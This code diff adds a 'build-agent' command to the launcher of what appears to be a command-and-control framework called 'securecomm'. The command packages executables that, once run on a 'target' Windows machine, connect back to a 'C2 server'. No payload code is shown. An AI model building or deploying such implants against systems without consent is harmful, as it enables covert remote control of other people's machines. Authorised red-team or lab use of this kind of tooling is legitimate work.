@@ -19,6 +19,7 @@ from securecomm.pki_manager import PKIManager
 from securecomm.crypto_engine import CryptoEngine
 from securecomm.operator import OperatorConsole
 from securecomm.agent import SecureAgent
+from securecomm.agent_builder import AgentBuilder, build_agent
 from securecomm.config import (
     DASHBOARD_HOST,
     DASHBOARD_PORT,
@@ -162,6 +163,64 @@ def start_dashboard(args):
         token=args.token,
     )
 
+def build_agent_command(args):
+    """Build agent executable and package"""
+    print(BANNER)
+    print(f"🔨 Building Agent Package\n")
+    print(f"   Agent ID: {args.agent_id}")
+    print(f"   Server: {args.server}:{args.port}")
+    print(f"   Platform: {args.platform}")
+    print()
+    
+    # Check if certificates exist
+    agent_cert = Path(f"data/pki/agents/{args.agent_id}.crt")
+    agent_key = Path(f"data/pki/agents/{args.agent_id}.key")
+    ca_cert = Path("data/pki/ca/ca_root.crt")
+    
+    if not agent_cert.exists() or not agent_key.exists():
+        print(f"❌ Agent certificates not found for {args.agent_id}")
+        print(f"   Expected: {agent_cert}")
+        print(f"   Expected: {agent_key}")
+        print()
+        print("Generate certificates first:")
+        print(f"  python launcher.py issue-cert --common-name {args.agent_id} --type agent")
+        return
+    
+    if not ca_cert.exists():
+        print(f"❌ CA certificate not found: {ca_cert}")
+        print("Initialize PKI first:")
+        print("  python launcher.py init-pki")
+        return
+    
+    # Build agent
+    builder = AgentBuilder()
+    success, result = builder.build_agent(
+        agent_id=args.agent_id,
+        server=args.server,
+        port=args.port,
+        platform=args.platform
+    )
+    
+    if success:
+        print(f"✅ Agent built successfully!")
+        print()
+        print(f"Package Contents:")
+        print(f"  📄 Config: {result['config_path']}")
+        if result['executable_path']:
+            print(f"  ⚙️  Executable: {result['executable_path']}")
+        print(f"  📦 ZIP Package: {result['zip_path']}")
+        print()
+        print(f"Deploy the agent:")
+        print(f"  1. Extract {result['zip_path']} on target Windows machine")
+        print(f"  2. Run the executable: securecomm_agent_{args.agent_id}.exe")
+        print(f"  3. Agent will connect to {args.server}:{args.port}")
+        print()
+        print(f"Monitor in dashboard:")
+        print(f"  http://localhost:8080/agents")
+    else:
+        print(f"❌ Build failed: {result.get('error', 'Unknown error')}")
+        return 1
+
 def show_status(args):
     """Show system status"""
     print(BANNER)
@@ -238,6 +297,12 @@ Examples:
   # Start agent
   python launcher.py agent --agent-id AGT001 --server 192.168.1.100
   
+  # Build agent package
+  python launcher.py build-agent --agent-id AGT001 --server 192.168.1.100
+  
+  # Start dashboard (with authentication)
+  python launcher.py dashboard --host 127.0.0.1 --port 8080 --token ""
+  
   # Run tests
   python launcher.py test --coverage
   
@@ -287,6 +352,14 @@ Examples:
     test_parser = subparsers.add_parser('test', help='Run test suite')
     test_parser.add_argument('--coverage', action='store_true', help='Generate coverage report')
     test_parser.set_defaults(func=run_tests)
+    
+    # build-agent command
+    build_parser = subparsers.add_parser('build-agent', help='Build agent executable package')
+    build_parser.add_argument('--agent-id', required=True, help='Agent identifier')
+    build_parser.add_argument('--server', required=True, help='C2 server address')
+    build_parser.add_argument('--port', type=int, default=8443, help='C2 server port')
+    build_parser.add_argument('--platform', choices=['windows', 'linux'], default='windows', help='Target platform')
+    build_parser.set_defaults(func=build_agent_command)
     
     # status command
     status_parser = subparsers.add_parser('status', help='Show system status')
